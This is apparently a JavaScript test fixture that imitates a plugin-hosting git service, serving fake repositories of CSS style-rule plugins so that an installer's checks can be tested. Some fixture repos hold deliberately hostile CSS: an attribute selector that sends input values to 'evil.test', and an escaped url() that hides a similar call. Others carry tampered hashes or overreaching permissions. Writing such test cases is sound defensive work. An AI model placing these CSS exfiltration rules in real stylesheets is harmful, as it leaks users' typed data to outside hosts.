// A stand-in for gitstable's plugin addresses, for the tests: the git ref list (tags) and files at a commit, with the
// X-Git-Blob / X-Git-Commit headers gitstable sends. Repositories are made up here; the "commits" are fixed ids.
//   GET /git/<owner>/<repo>.git/info/refs?service=git-upload-pack
//   GET /repositories/<owner>/<repo>/raw/<path>?at=<commit>
import { createHash } from "node:crypto";

const blobId = (buf) => createHash("sha1").update(`blob ${buf.length}\0`).update(buf).digest("hex");
const commitOf = (name) => createHash("sha1").update("commit " + name).digest("hex");

const rule = (id, extra = {}) =>
  JSON.stringify({ v: 1, id, name: "Wide page", kind: "style-rule", version: "2026.11v1", sites: ["127.0.0.1"], powers: ["style"], style: `${id}.css`, min_api: 1, tested_on: ["2026.11v1"], license: "MIT", description: "The demo page's column uses the whole window.", ...extra }, null, 2) + "\n";
const WIDE_CSS = "/* the column uses the whole window */\n#col { max-width: none !important; }\n";

// name → { tags: {tag: {annotated, files}}, lieAboutBlob? }
const REPOS = {
  "demo/wide": {
    tags: {
      "2026.11v1": { annotated: true, files: { "dbbasic-rule.json": rule("wide"), "wide.css": WIDE_CSS } },
      "2026.10v1": { files: { "dbbasic-rule.json": rule("wide", { version: "2026.10v1" }), "wide.css": "#col { max-width: 700px !important; }\n" } },
    },
  },
  "demo/sneaky": { tags: { "2026.11v1": { files: { "dbbasic-rule.json": rule("sneaky"), "sneaky.css": 'input[value^="a"] { background: url("https://evil.test/a"); }\n' } } } },
  "demo/escaped": { tags: { "2026.11v1": { files: { "dbbasic-rule.json": rule("escaped"), "escaped.css": "#col { background: \\75 rl(https://evil.test/x); }\n" } } } },
  "demo/scripty": { tags: { "2026.11v1": { files: { "dbbasic-rule.json": rule("scripty", { powers: ["style", "page-script"] }), "scripty.css": WIDE_CSS } } } },
  "demo/tampered": { lieAboutBlob: true, tags: { "2026.11v1": { files: { "dbbasic-rule.json": rule("tampered"), "tampered.css": WIDE_CSS } } } },
  "demo/mislabelled": { tags: { "2026.11v1": { files: { "dbbasic-rule.json": rule("mislabelled", { version: "2026.11v9" }), "mislabelled.css": WIDE_CSS } } } },
  "demo/future": { tags: { "2026.11v1": { files: { "dbbasic-rule.json": rule("future", { min_api: 99 }), "future.css": WIDE_CSS } } } },
};

let listHits = 0;

function pkt(line) {
  return (line.length + 4).toString(16).padStart(4, "0") + line;
}

function refsBody(repo) {
  const lines = [pkt("# service=git-upload-pack\n"), "0000"];
  const head = commitOf(repo + "@main");
  lines.push(pkt(`${head} HEAD\0multi_ack side-band-64k symref=HEAD:refs/heads/main\n`), pkt(`${head} refs/heads/main\n`));
  for (const [tag, t] of Object.entries(REPOS[repo].tags)) {
    if (t.annotated) {
      lines.push(pkt(`${commitOf(repo + "@tag-object-" + tag)} refs/tags/${tag}\n`), pkt(`${commitOf(repo + "@" + tag)} refs/tags/${tag}^{}\n`));
    } else lines.push(pkt(`${commitOf(repo + "@" + tag)} refs/tags/${tag}\n`));
  }
  lines.push("0000");
  return lines.join("");
}

/** Answers a fake-gitstable request, or returns false when the address isn't one of its. */
export function fakeGitstable(req, res) {
  const u = new URL(req.url, "http://x");
  const origin = `http://${req.headers.host}`;
  // The list of plugins (only demo/wide is listed, as gitstable lists only its reviewed set), and pages for it.
  if (u.pathname === "/store/plugins.json") {
    const tag = "2026.11v1";
    const item = { slug: "wide", id: "wide", name: "Wide page", kind: "style-rule", summary: "The demo page's column uses the whole window.", repository: "demo/wide", tag, commit: commitOf("demo/wide@" + tag), sites: ["127.0.0.1"], powers: ["style"], url: origin + "/store/wide/", repository_url: origin + "/repositories/demo/wide/", price_usd: 0 };
    listHits++;
    res.writeHead(200, { "content-type": "application/json", "cache-control": "public, max-age=300" }).end(JSON.stringify({ v: 1, items: [item] }));
    return true;
  }
  if (u.pathname === "/o/_plugin-list-hits") { res.writeHead(200, { "content-type": "application/json" }).end(JSON.stringify({ hits: listHits })); return true; }
  if (u.pathname === "/store/wide/" || u.pathname === "/repositories/demo/wide/" || u.pathname === "/store/") {
    res.writeHead(200, { "content-type": "text/html; charset=utf-8" }).end(`<!doctype html><title>Wide page · plugin</title><h1>Wide page</h1><p>A plugin page on the stand-in gitstable.</p>`);
    return true;
  }
  let m = /^\/git\/([^/]+\/[^/]+)\.git\/info\/refs$/.exec(u.pathname);
  if (m) {
    const repo = m[1];
    if (!REPOS[repo] || u.searchParams.get("service") !== "git-upload-pack") { res.writeHead(404).end("not found"); return true; }
    res.writeHead(200, { "content-type": "application/x-git-upload-pack-advertisement", "cache-control": "no-cache" }).end(refsBody(repo));
    return true;
  }
  m = /^\/repositories\/([^/]+\/[^/]+)\/raw\/(.+)$/.exec(u.pathname);
  if (m) {
    const [, repo, path] = m;
    const at = u.searchParams.get("at") || "";
    const r = REPOS[repo];
    const tag = r && Object.keys(r.tags).find((t) => commitOf(repo + "@" + t) === at);
    const text = tag ? r.tags[tag].files[path] : undefined;
    if (text === undefined) { res.writeHead(404).end("not found"); return true; }
    const buf = Buffer.from(text);
    res.writeHead(200, {
      "content-type": "text/plain; charset=utf-8", "x-content-type-options": "nosniff", "cache-control": "public, max-age=31536000, immutable",
      "x-git-blob": r.lieAboutBlob && path.endsWith(".css") ? blobId(Buffer.from(text + " ")) : blobId(buf), "x-git-commit": at,
    }).end(buf);
    return true;
  }
  return false;
}
